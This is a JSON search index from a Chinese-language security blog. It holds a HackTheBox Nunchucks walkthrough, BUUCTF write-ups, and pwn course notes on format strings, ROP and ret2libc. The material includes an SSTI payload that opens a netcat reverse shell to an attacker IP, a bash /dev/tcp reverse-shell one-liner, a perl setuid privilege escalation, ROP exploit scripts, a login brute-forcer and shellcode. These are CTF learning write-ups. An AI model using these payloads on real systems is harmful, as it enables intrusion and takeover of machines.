[{"categories":["writeups","hackthebox"],"content":"HackTheBox Nunchucks Walkthrough","date":"2022-02-11","objectID":"/hackthebox-nunchucks-walkthrough/","tags":["writeup","hackthebox","Linux","NodeJS","SSTI","SUID"],"title":"HackTheBox Nunchucks Walkthrough","uri":"/hackthebox-nunchucks-walkthrough/"},{"categories":["writeups","hackthebox"],"content":"Enumeration ","date":"2022-02-11","objectID":"/hackthebox-nunchucks-walkthrough/:0:0","tags":["writeup","hackthebox","Linux","NodeJS","SSTI","SUID"],"title":"HackTheBox Nunchucks Walkthrough","uri":"/hackthebox-nunchucks-walkthrough/"},{"categories":["writeups","hackthebox"],"content":"Nmap ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.222 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) # $ports=22,80 nmap -sC -sV -p$ports 10.10.11.122 # Nmap 7.92 scan initiated Wed Feb 9 22:22:20 2022 as: nmap -sC -sV -p22,80,443 -v -oN nmaplog.txt 10.10.11.122 Nmap scan report for 10.10.11.122 Host is up (0.32s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://nunchucks.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-favicon: Unknown favicon MD5: 4BD6ED13BE03ECBBD7F9FA7BAA036F95 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Nunchucks - Landing Page | tls-nextprotoneg: |_ http/1.1 | ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK | Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb | Issuer: commonName=Nunchucks-CA/countryName=US | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-08-30T15:42:24 | Not valid after: 2031-08-28T15:42:24 | MD5: 57fc 410d e809 1ce6 82f9 7bee 4f39 6fe4 |_SHA-1: 518c 0fd1 6903 75c0 f26b a6cb e37d 53b8 a3ff 858b | tls-alpn: |_ http/1.1 |_http-server-header: nginx/1.18.0 (Ubuntu) |_ssl-date: TLS randomness does not represent time Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done 1 IP address (1 host up) scanned in 34.33 seconds","date":"2022-02-11","objectID":"/hackthebox-nunchucks-walkthrough/:1:0","tags":["writeup","hackthebox","Linux","NodeJS","SSTI","SUID"],"title":"HackTheBox Nunchucks Walkthrough","uri":"/hackthebox-nunchucks-walkthrough/"},{"categories":["writeups","hackthebox"],"content":"Web Application 修改hosts文件 sudo echo \"10.10.11.122 nunchucks.htb\" \u003e\u003e /etc/hosts访问网站，自动转为https协议，扫描目录 dirsearch -u 'https://nunchucks.htb' [23:09:36] Starting: [23:09:42] 400 - 166B - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [23:10:37] 301 - 179B - /assets -\u003e /assets/ [23:10:44] 400 - 166B - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [23:11:16] 200 - 9KB - /login [23:11:17] 200 - 9KB - /login/ [23:11:37] 200 - 19KB - /privacy [23:11:42] 400 - 1KB - /servlet/%C0%AE%C0%AE%C0%AF [23:11:45] 200 - 9KB - /signup [23:11:53] 200 - 17KB - /terms Task Completed发现注册和登录页面，访问注册页面进行注册 注册、登录均关闭，继续爆破子域名 wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 2271 -H \"Host: FUZZ.nunchucks.htb\" -u \"https://nunchucks.htb\" ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: https://nunchucks.htb/ Total requests: 4997 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000081: 200 101 L 259 W 4028 Ch \"store\" hosts文件加入store.nunchucks.htb后访问页面 Vuln ","date":"2022-02-11","objectID":"/hackthebox-nunchucks-walkthrough/:2:0","tags":["writeup","hackthebox","Linux","NodeJS","SSTI","SUID"],"title":"HackTheBox Nunchucks Walkthrough","uri":"/hackthebox-nunchucks-walkthrough/"},{"categories":["writeups","hackthebox"],"content":"SSTI 输入邮箱地址，通过burp抓包修改参数可以发现SSTI漏洞 NUNJUCKS(NodeJS) SSTI vulnerability 模板注入反弹shell # payload:{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc 10.10.16.4 4444 \u003e/tmp/f')\\\")()}} nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.11.122] 49368 sh: 0: can't access tty; job control turned off $ pwd /var/www/store.nunchucks $ cd ~ $ ls user.txt # 获取sshshell $ mkdir .ssh $ cd .ssh $ echo id_rsa.pub \u003e authorized_keys ssh david@10.10.11.122 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-86-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri 11 Feb 01:11:31 UTC 2022 System load: 0.55 Usage of /: 48.8% of 6.82GB Memory usage: 45% Swap usage: 0% Processes: 270 Users logged in: 0 IPv4 address for ens160: 10.10.11.122 IPv6 address for ens160: dead:beef::250:56ff:feb9:19d7 10 updates can be applied immediately. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update david@nunchucks:/tmp$ id uid=1000(david) gid=1000(david) groups=1000(david) Privilege Escalation 查看可执行文件 david@nunchucks:/tmp$ find / -type f -perm -u=s 2\u003e/dev/null /usr/bin/fusermount /usr/bin/umount /usr/bin/chsh /usr/bin/chfn /usr/bin/at /usr/bin/mount /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/passwd /usr/bin/pkexec /usr/bin/su /usr/bin/sudo /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/sbin/pppd同时查看网站配置文件发现mysql用户名密码，经测试均无法提权 最后经网上搜索发现通过getcap查看文件capabilities david@nunchucks:/tmp$ getcap -r / 2\u003e/dev/null /usr/bin/perl = cap_setuid+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep发现perl有cap_setuid+ep属性，可以通过perl提权 参考https://gtfobins.github.io/gtfobins/perl/#capabilities # 尝试提权 david@nunchucks:/tmp$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' david@nunchucks:/tmp$ id uid=1000(david) gid=1000(david) groups=1000(david) # 未成功 - - # 使用其他命令 david@nunchucks:/tmp$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"id\";' uid=0(root) gid=1000(david) groups=1000(david) david@nunchucks:/tmp$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"cat /root/root.txt\";' cat: /root/root.txt: Permission denied # 无权限，什么鬼？继续搜索…发现使用了AppArmor技术 AppArmor Introduction AppArmor is a Mandatory Access Control (MAC) system which is a kernel (LSM) enhancement to confine programs to a limited set of resources. AppArmor’s security model is to bind access control attributes to programs rather than to users. AppArmor confinement is provided via profiles loaded into the kernel, typically on boot. AppArmor profiles can be in one of two modes: enforcement and complain. Profiles loaded in enforcement mode will result in enforcement of the policy defined in the profile as well as reporting policy violation attempts (either via syslog or auditd). Profiles in complain mode will not enforce policy but instead report policy violation attempts. AppArmor differs from some other MAC systems on Linux: it is path-based, it allows mixing of enforcement and complain mode profiles, it uses include files to ease development, and it has a far lower barrier to entry than other popular MAC systems. AppArmor is an established technology first seen in Immunix and later integrated into Ubuntu, Novell/SUSE, and Mandriva. Core AppArmor functionality is in the mainline Linux kernel from 2.6.36 onwards; work is ongoing by AppArmor, Ubuntu and other developers to merge additional AppArmor functionality into the mainline kernel. 查看/etc/apparmor.d/usr.bin.perl # Last Modified: Tue Aug 31 18:2","date":"2022-02-11","objectID":"/hackthebox-nunchucks-walkthrough/:3:0","tags":["writeup","hackthebox","Linux","NodeJS","SSTI","SUID"],"title":"HackTheBox Nunchucks Walkthrough","uri":"/hackthebox-nunchucks-walkthrough/"},{"categories":["writeups"],"content":"BUU BRUTE 1","date":"2022-01-30","objectID":"/buuctf-buu-brute-1-writeup/","tags":["writeup","buuctf"],"title":"BUUCTF - BUU BRUTE 1 Writeup","uri":"/buuctf-buu-brute-1-writeup/"},{"categories":["writeups"],"content":"进入题目url查看，是个登录界面，先输入admin/admin发现提示 密码错误，为四位数字。而且是get请求，结合题目，简单爆破 ","date":"2022-01-30","objectID":"/buuctf-buu-brute-1-writeup/:0:0","tags":["writeup","buuctf"],"title":"BUUCTF - BUU BRUTE 1 Writeup","uri":"/buuctf-buu-brute-1-writeup/"},{"categories":["writeups"],"content":"crunch生成字典 crunch 4 4 -f /usr/share/crunch/charset.lst numeric -o adminpass.txt","date":"2022-01-30","objectID":"/buuctf-buu-brute-1-writeup/:1:0","tags":["writeup","buuctf"],"title":"BUUCTF - BUU BRUTE 1 Writeup","uri":"/buuctf-buu-brute-1-writeup/"},{"categories":["writeups"],"content":"爆破脚本 #!/usr/bin/env python # -*- coding:utf-8 -*- import requests import time f = open('./adminpass.txt','r') payload = f.readline().strip() while payload: print('\\rpayload:'+payload,end=\"\") res = requests.get(\"http://d60d9c19-efe0-4b6a-82c5-0d238a94a44b.node4.buuoj.cn:81/?username=admin\u0026password=\"+payload) time.sleep(0.2) if '密码错误' not in res.text: print(res.text) f.close() break else: payload = f.readline().strip()payload:6490登录成功。flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} ","date":"2022-01-30","objectID":"/buuctf-buu-brute-1-writeup/:2:0","tags":["writeup","buuctf"],"title":"BUUCTF - BUU BRUTE 1 Writeup","uri":"/buuctf-buu-brute-1-writeup/"},{"categories":["writeups"],"content":"BUU CODE REVIEW 1","date":"2022-01-30","objectID":"/buuctf-buu-code-review-1-writeup/","tags":["writeup","buuctf"],"title":"BUUCTF - BUU CODE REVIEW 1 Writeup","uri":"/buuctf-buu-code-review-1-writeup/"},{"categories":["writeups"],"content":" \u003c?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/10/6 * Time: 8:04 PM */ highlight_file(__FILE__); class BUU { public $correct = \"\"; public $input = \"\"; public function __destruct() { try { $this-\u003ecorrect = base64_encode(uniqid()); if($this-\u003ecorrect === $this-\u003einput) { echo file_get_contents(\"/flag\"); } } catch (Exception $e) { } } } if($_GET['pleaseget'] === '1') { if($_POST['pleasepost'] === '2') { if(md5($_POST['md51']) == md5($_POST['md52']) \u0026\u0026 $_POST['md51'] != $_POST['md52']) { unserialize($_POST['obj']); } } }一共要读取5个参数：get参数pleaseget，post参数pleasepost、md51、md52和obj 考点1：php强弱类型比较 考点2：uniqid() 函数 //基于以微秒计的当前时间，生成一个唯一的 ID。 考点3：引用赋值 php payload class BUU{ public $correct = \"\"; public $input = \"\"; } $b = new BUU(); $b-\u003einput = \u0026$b-\u003ecorrect; echo serialize($b); # O:3:\"BUU\":2:{s:7:\"correct\";s:0:\"\";s:5:\"input\";R:2;} poc #!/usr/bin/env python # -*- coding:utf-8 -*- import requests import re flag = '' url = 'http://1047cab0-ea8a-4945-8421-86af8b408454.node4.buuoj.cn:81/?pleaseget=1' data = {'pleasepost':'2','md51[]':'1','md52[]':'2','obj':'O:3:\"BUU\":2:{s:7:\"correct\";s:0:\"\";s:5:\"input\";R:2;}'} #md5值比较绕过有两种方法：1.互联网搜索两个MD5值为0e开头的字符串;2.使用list绕过 res = requests.post(url,data) if 'flag{' in res.text: flag = re.search(r'flag\\{(.*)\\}',res.text)[0] print(flag)","date":"2022-01-30","objectID":"/buuctf-buu-code-review-1-writeup/:0:0","tags":["writeup","buuctf"],"title":"BUUCTF - BUU CODE REVIEW 1 Writeup","uri":"/buuctf-buu-code-review-1-writeup/"},{"categories":["NTU STCS 2016"],"content":"format string vulnerable exploit","date":"2020-08-30","objectID":"/ntu-stcs-2016-w6/","tags":["pwn"],"title":"NTU STCS 2016 0x04 Format String","uri":"/ntu-stcs-2016-w6/"},{"categories":["NTU STCS 2016"],"content":"Format String 在输出火字符串处理函数中用来表示输出的字符串格式 在以下的\"%s %d\"即为format string printf(\"%s %d\\n\", str, a); fprintf(stderr, \"%s %d\\n\", str, a); sprintf(buffer, \"%s %d\\n\", str, a);","date":"2020-08-30","objectID":"/ntu-stcs-2016-w6/:0:0","tags":["pwn"],"title":"NTU STCS 2016 0x04 Format String","uri":"/ntu-stcs-2016-w6/"},{"categories":["NTU STCS 2016"],"content":"Format String Vulnerablility 错误的使用方式，直接将使用者的输入作为fmt使用 将printf(\"%s\", str)，写成gets(str);printf(str); 此类错误不易发现，因为如果没有测试特殊input执行结果不变 ","date":"2020-08-30","objectID":"/ntu-stcs-2016-w6/:1:0","tags":["pwn"],"title":"NTU STCS 2016 0x04 Format String","uri":"/ntu-stcs-2016-w6/"},{"categories":["NTU STCS 2016"],"content":"fmt使用方式 printf(\"%2$*1$d\", width, num); %2$制定要以%d输出的是第几个参数 1$制定要作为输出的长度是第几个参数 width = 10,num = 5时相当于printf(\"%10d\", 5) 例子:fmt1 source code #include \u003cstdio.h\u003e int main(){ setvbuf(stdout,0,_IONBF,0); alarm(180); char str[100]; while(gets(str)) { printf(str); } return 0; }","date":"2020-08-30","objectID":"/ntu-stcs-2016-w6/:2:0","tags":["pwn"],"title":"NTU STCS 2016 0x04 Format String","uri":"/ntu-stcs-2016-w6/"},{"categories":["NTU STCS 2016"],"content":"fmt漏洞成因 format string可以被攻击者的输入人以控制，而printf本身不会检查后面有几个参数 使用%x会造成stack上的info leak 使用$控制要leak的位置 PS.： x64的程序使用%lx ","date":"2020-08-30","objectID":"/ntu-stcs-2016-w6/:3:0","tags":["pwn"],"title":"NTU STCS 2016 0x04 Format String","uri":"/ntu-stcs-2016-w6/"},{"categories":["NTU STCS 2016"],"content":"leak libc base 程序执行起点为_start，把main作为参数传入__libc_start_main __libc_start_main会先完成初始化造作，之后call main函数 main的ret addr指向libc内部，且存放在stack上的值可以用%x泄露出来 leak出来的位数ec5和return会libc里的位置一致，但由于ASLR的关系使得高位随机 会return的位置会在call exit前面一些 $ ./fmt1 %21$lx 7f0438b721e3stackguard(CANARY) 编译器对stack overflow的一种保护机制 在call函数时在stack上放的值 函数return时先检查CANARY是否被修改 ","date":"2020-08-30","objectID":"/ntu-stcs-2016-w6/:4:0","tags":["pwn"],"title":"NTU STCS 2016 0x04 Format String","uri":"/ntu-stcs-2016-w6/"},{"categories":["NTU STCS 2016"],"content":"Leak StackGuard Canary ","date":"2020-08-30","objectID":"/ntu-stcs-2016-w6/:5:0","tags":["pwn"],"title":"NTU STCS 2016 0x04 Format String","uri":"/ntu-stcs-2016-w6/"},{"categories":["NTU STCS 2016"],"content":"利用leak canary攻击 ","date":"2020-08-30","objectID":"/ntu-stcs-2016-w6/:6:0","tags":["pwn"],"title":"NTU STCS 2016 0x04 Format String","uri":"/ntu-stcs-2016-w6/"},{"categories":["NTU STCS 2016"],"content":"ROP call function","date":"2020-08-29","objectID":"/ntu-stcs-2016-w5/","tags":["pwn"],"title":"NTU STCS 2016 0x03 ROP2","uri":"/ntu-stcs-2016-w5/"},{"categories":["NTU STCS 2016"],"content":"ret2syscall 跳.plt entry 函数参数直接放到接下来的stack 用pop-ret处理用过的参数 ret2libc printf,gets,puts等函数所在位置:libc.so.6 直接用rop call libc 的system 用条件 libc版本或者fuction的offset已知 ASLR开启情况 Dynamically Linded Elf 动态链接库相关操作 # 获取libc路径 ldd ./binary # 查看libc中的相对位置 # trick 使用 | grep ' system@'来查看想找的symbol readelf -s /lib32/libc.so.6 | grep ' system@' # 指定加载的libc位置 LD_LIBRARY_PATH=./path/to/libcFunction Lazy Binding library在binary执行时才加载，第一次call function时解析函数位置填入.got.plt 推算libc base addr 函数在libc的相对位置不变 使用readelf得知__libc_start_main和system在libc的相对位置 使用任意输入函数print出__libc-start_main的.got内容，推算system在内存的addr 用rop构造puts(__libc_start_main@got) 要leak的got entry,对应的function必须已经被call过 前提：已有或已知远端libc.so.6版本 Libc Data Base 已知两个function的address时可以在libcdb里找对应的版本 ✘网站：libcdb.com:the libc data base ✘网站：libc.nullbyte.cat ✔使用LibcSearcher from LibcSearcher import * #第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型 obj = LibcSearcher(\"fgets\", 0X7ff39014bd90) obj.dump(\"system\") #system 偏移 obj.dump(\"str_bin_sh\") #/bin/sh 偏移 obj.dump(\"__libc_start_main_ret\") Leak libc base 一般leak __libc_start_main的地址，通过LibcSearcher获取system与/bin/sh的地址，再跳转回main触发溢出执行system(’/bin/sh’) 例子：ret2libc3 #!/usr/bin/env python from pwn import * from LibcSearcher import LibcSearcher sh = process('./ret2libc3') ret2libc3 = ELF('./ret2libc3') puts_plt = ret2libc3.plt['puts'] libc_start_main_got = ret2libc3.got['__libc_start_main'] main = ret2libc3.symbols['main'] print \"leak libc_start_main_got addr and return to main again\" payload = flat(['A' * 112, puts_plt, main, libc_start_main_got]) sh.sendlineafter('Can you find it !?', payload) print \"get the related addr\" libc_start_main_addr = u32(sh.recv()[0:4]) libc = LibcSearcher('__libc_start_main', libc_start_main_addr) libcbase = libc_start_main_addr - libc.dump('__libc_start_main') system_addr = libcbase + libc.dump('system') binsh_addr = libcbase + libc.dump('str_bin_sh') print \"get shell\" payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr]) sh.sendline(payload) sh.interactive()trick:开启reverse tcp shell(web同时适用) system(“bash -c ‘bash -i \u003e\u0026 /dev/tcp/to.your.ip.addr/31337 0\u003e\u00261’”) # system(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/127.0.0.1/31337 0\u003e\u00261'\") nc -vlp 31337ROP for x86-64 64-bin ROP syscall 要用rax,rdi,rsi,rdx,rcx,r8,r9,syscall Function call参数传递适用寄存器而不是栈 rdi,rsi,rdx,rcx,r8,r9 需要用pop-ret控制register，再接function address 64-bit register rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi r8-r15是用前8个加上rex prefix来表示 r12-r15是callee saved，所以pop r12 - r15在function return前很常见 pop r14 = 415e / pop rsi = 5e pop r15 = 415f / pop rdi = 5f ROPgadget ROPgadget预设的搜索长度对64位来说可能不太够，需要增加–depth ROPgadget --binary ./binary --depth 100通用gadget 64bit rop需要gadget控制参数 gcc的程序中有一些片段一定会有，可以用来做rop，构造ret2lib不是问题 De-ASLR with ROP Calculate Runction Address without Information Leakage Linux 常用保护机制开关方法 # cannary 栈保护 gcc -o test test.c # 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c #禁用栈保护 gcc -fstack-protector -o test test.c #启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c #启用堆栈保护，为所有函数插入保护代码 # FORTIFY 检查是否存在缓冲区溢出的错误 gcc -o test test.c #默认情况下，不会开这个检查 gcc -D_FORTIFY_SOURCE=1 -o test test.c #较弱的检查 gcc -D_FORTIFY_SOURCE=2 -o test test.c #较强的检查 # NX（DEP）No-eXecute gcc -o test test.c #默认情况下，开启NX保护 gcc -z execstack -o test test.c #禁用NX保护 gcc -z noexecstack -o test test.c #开启NX保护 # PIE（ASLR） # liunx下关闭PIE的命令 sudo -s echo 0 \u003e /proc/sys/kernel/randomize_va_space # gcc编译命令 gcc -o test test.c #默认情况下，不开启PIE gcc -fpie -pie -o test test.c #开启PIE，此时强度为1 gcc -fPIE -pie -o test test.c #开启PIE，此时为最高强度2 gcc -fpic -o test test.c #开启PIC，此时强度为1，不会开启PIE gcc -fPIC -o test test.c #开启PIC，此时为最高强度2，不会开启PIE # RELRO gcc编译： gcc -o test test.c #默认情况下，是Partial RELRO gcc -z norelro -o test test.c #关闭，即No RELRO gcc -z lazy -o test test.c #部分开启，即Partial RELRO gcc -z now -o test test.c #全部开启，即full RELRO例子:gets libc.so.6 #!/usr/bin/env python from pwn import * # context.log_level = 'debug' context.arch = 'amd64' local = 1 if local: p = process('./gets') # p = remote('127.0.0.1', 4000) libc = ELF('/lib/x86_64-linux-gnu/libc.","date":"2020-08-29","objectID":"/ntu-stcs-2016-w5/:0:0","tags":["pwn"],"title":"NTU STCS 2016 0x03 ROP2","uri":"/ntu-stcs-2016-w5/"},{"categories":["NTU STCS 2016"],"content":"week4 shellcode rop","date":"2020-08-25","objectID":"/ntu-stcs-2016-w4/","tags":["pwn"],"title":"NTU STCS 2016 0x02 ROP","uri":"/ntu-stcs-2016-w4/"},{"categories":["NTU STCS 2016"],"content":"gdbserver # in bash commandline gdbserver 127.0.0.1:4000 ./binary #break在entrypoint # in gdb commandline gdb ./binary $ target remote 127.0.0.1:4000 $ continue # 搭配ncat ncat -vc 'gdbserver 127.0.0.1:4000 .binary' -kl 127.0.0.1 5000trick 使用gdbscript attach pid # .gdbinit set disassembly-flavor intel define at shell echo attach $(pidof -s $arg0) \u003e /tmp/foo.gdb source /tmp/foo.gdb end rop 类型包括:ret2syscall ret2text ret2libc ","date":"2020-08-25","objectID":"/ntu-stcs-2016-w4/:0:0","tags":["pwn"],"title":"NTU STCS 2016 0x02 ROP","uri":"/ntu-stcs-2016-w4/"},{"categories":["NTU STCS 2016"],"content":"rop2syscall 找gadget控制syscall需要的regs(eax,ebx,ecx,edx) 需要int 80 RopGadget #usage RopGadget --binary ./binary #int 80 ; ret RopGadget --binary ./binary --opcode cd80c3 PS:execve需要’/bin/sh’，且地址必须已知 用read吧需要的字符串输入至已知地址的buffer上 找可写page用于read(0,buf_addr,len)中的buf_addr 一般用bss最后一页即可 cat /proc/`pidof binary`/maps readelf -a binary | less # 看Section Headers中的.bsseg. #!/usr/bin/env python from pwn import * context.arch = 'i386' p = process('./p1') elf = ELF('./p1') g = lambda x: next(elf.search(asm(x))) pop_eax_ret = g('pop eax ; ret') # 0x080b8126 pop_ebx_ret = g('pop ebx ; ret') # 0x080481c9 pop_ecx_ret = g('pop ecx ; ret') # 0x080de849 pop_edx_ret = g('pop edx ; ret') # 0x0806edca int_0x80_ret = g('int 0x80 ; ret') buf = 0x080eb000 - 100 raw_input('@') offset = 62 # read(0, '/bin/sh\\x00', 100) rop1 = [ pop_eax_ret, 3, pop_ebx_ret, 0, pop_ecx_ret, buf, pop_edx_ret, 100, int_0x80_ret, ] # execve('/bin/sh\\x00', 0, 0) rop2 = [ pop_eax_ret, 0xb, pop_ebx_ret, buf, pop_ecx_ret, 0, pop_edx_ret, 0, int_0x80_ret ] payload = 'A' * offset + ''.join(map(p32, rop1)) + ''.join(map(p32, rop2)) p.sendline(payload) p.sendline('/bin/sh\\x00') p.interactive()","date":"2020-08-25","objectID":"/ntu-stcs-2016-w4/:1:0","tags":["pwn"],"title":"NTU STCS 2016 0x02 ROP","uri":"/ntu-stcs-2016-w4/"},{"categories":["NTU STCS 2016"],"content":"使用较长的gadget leave指令 #leave mov esp, ebp pop ebpTrick: Stack Migration 使用leave把栈放到已知位置 确定rop chain的位置时可以直接附加其他data 可以无限rop migrate后的空间要足够 gadget1 = 0x8048898 # gadget1 has gets() and leave_ret # 8048898: 50 push eax # 8048899: e8 e2 69 00 00 call 804f280 \u003c_IO_gets\u003e # 804889e: 83 c4 10 add esp,0x10 # 80488a1: 90 nop # 80488a2: c9 leave # 80488a3: c3 ret migration = [ pop_ebp_ret, buf - 4, #leave会pop ebp，所以要控制到buf-4位置 pop_eax_ret, buf, gadget1, ] rop = [ pop_eax_ret, 0xb, pop_ebx_ret, buf + 9 * 4, #ropchain一共有9*4bytes pop_ecx_ret, 0, pop_edx_ret, 0, int_0x80_ret ] payload1 = 'A' * offset + ''.join(map(p32, migration)) payload2 = ''.join(map(p32, rop)) + '/bin/sh\\x00'","date":"2020-08-25","objectID":"/ntu-stcs-2016-w4/:1:1","tags":["pwn"],"title":"NTU STCS 2016 0x02 ROP","uri":"/ntu-stcs-2016-w4/"},{"categories":["NTU STCS 2016"],"content":"StackOverflow","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"objdump 常用指令 objdump -T binary cat /proc/`pidof binary`/maps","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:1:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"readelf 分析elf binary header里的一些信息 readelf -a | grep STACK 看能否跑shellcode $ readelf -a ./binary | grep STACK GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10trick readelf -a ./binary | grep ' system@' ldd binarytrick:execstack $ execstack --h Usage: execstack [OPTION...] execstack -- program to query or set executable stack flag -c, --clear-execstack Clear executable stack flag bit -q, --query Query executable stack flag bit -s, --set-execstack Set executable stack flag bit -?, --help Give this help list --usage Give a short usage message -V, --version Print program version Report bugs to \u003cjakub@redhat.com\u003e. ","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:2:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"ncat 建立local service环境，因为你不会再无法debug的情况下直接对remote做事 ncat -vc ./binary -kl 127.0.0.1 8888 ncat -vc ‘strace -e trace=read ./binary’ -kl ::1 4000 ","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:3:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"GNU GDB layout asm attach [pid] echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scopeb,c,si,ni,fin x/3wx,x/7i,x/bx,x/s,p ","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:4:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"技巧 Hook\u0026Patch 当binary文件有alarm时关掉alarm $ sed -i s/alarm/isnan/g ./binary $ vim ./binary :%s/alarm/isnan/g #使用isnan函数替换alarm $ ltrace ./binary __libc_start_main(0x8048480, 1, 0xfffa3ba4, 0x80484c0 \u003cunfinished ...\u003e isnan(60, 0xffa2ed14, 0xffa2ed1c, 0xf75b2c8b) = 0hook alarm by LD_PRELOAD // hook.c #include \u003cstdio.h\u003e unsigned int alarm(unsigned int seconds){ printf(\"%d\\n\", seconds); } gcc hook.c -o hook.so -shared -fPIC -m32 LD_PRELOAD=./hook.so ./binaryLD_SHOW_AUXV $ ncat -vc 'LD_SHOW_AUXV=1 ./level2' -kl 127.0.0.1 6666 Ncat: Version 7.80 ( https://nmap.org/ncat ) Ncat: Listening on 127.0.0.1:6666 Ncat: Connection from 127.0.0.1. Ncat: Connection from 127.0.0.1:36108 $ nc 127.0.0.1 6666 AT_SYSINFO: 0xf7f7ab40 AT_SYSINFO_EHDR: 0xf7f7a000 ... AT_PAGESZ: 4096 AT_CLKTCK: 100 AT_PHDR: 0x8048034 AT_PHENT: 32 AT_PHNUM: 9 AT_BASE: 0xf7f7b000 #librarybase AT_FLAGS: 0x0 AT_ENTRY: 0x8048350 ... AT_SECURE: 0 AT_RANDOM: 0xffd88bcb #stackout canary AT_HWCAP2: 0x0 ... AT_EXECFN: /bin/sh AT_PLATFORM: x86_64 Input: ","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:5:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"qira 非常好用的gdb动态调试工具，部署略 Ubuntu 14.04 and 16.04 supported out of the box. 18.04 is having a problem with building QEMU See forked QEMU source at https://github.com/geohot/qemu/tree/qira to fix. 使用方法 开启指令 python qira.py -s ./binary ","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:6:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"pwntools pip install pwntoolsDocumentation ","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:7:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"nasm X86编译工具，编译shellcode使用 nasm -felf32 test.asm -o test.o ld -melf_i386 test.o -o test objcopy -O binary test.o test.bin objdump -b binary -m i386 -D test.bine.g [section .data] global _start _start: jmp sh se: pop ebx xor eax, eax mov al, 11 xor ecx, ecx xor edx, edx int 0x80 sh: call se db '/bin/sh', 0注：使用mov eax, 0赋值时可能会出错 错误代码： se: pop ebx mov eax, 11 mov ecx, ecx mov edx, edx int 